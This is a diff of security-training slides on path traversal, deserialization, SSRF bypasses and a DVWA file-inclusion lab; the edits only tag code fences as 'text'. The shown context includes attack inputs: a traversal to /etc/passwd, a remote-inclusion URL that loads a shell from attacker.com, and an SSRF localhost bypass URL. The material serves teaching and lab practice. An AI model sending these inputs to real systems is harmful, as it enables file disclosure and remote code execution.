@@ -14,7 +14,7 @@ paginate: true
 
 Path traversal allows attackers to read files outside the intended directory by manipulating file path parameters.
 
-```
+```text
 Normal request:
   GET /download?file=report.pdf
   Server reads: /var/www/uploads/report.pdf
@@ -239,7 +239,7 @@ def secure_upload(file):
 
 ## Deserialization Attacks - Overview
 
-```
+```text
 Serialization: Converting an object to a byte stream
 Deserialization: Recreating an object from a byte stream
 
@@ -368,7 +368,7 @@ const payload = {
 
 ## Preventing Deserialization Attacks
 
-```
+```text
 1. NEVER deserialize untrusted data
    - Use JSON, XML, or other simple data formats
    - JSON.parse() is safe (no code execution)
@@ -516,7 +516,7 @@ libxml_disable_entity_loader(true);
 
 ## SSRF Bypass Techniques
 
-```
+```text
 # Bypassing SSRF blocklist filters:
 
 # IP address variations for 127.0.0.1
@@ -548,7 +548,7 @@ http://127.0.0.1#@target.com/    # Fragment confusion
 
 ## Lab: DVWA File Inclusion
 
-```
+```text
 Low security:
   ?page=../../../etc/passwd
   ?page=http://attacker.com/shell.php  (if RFI enabled)
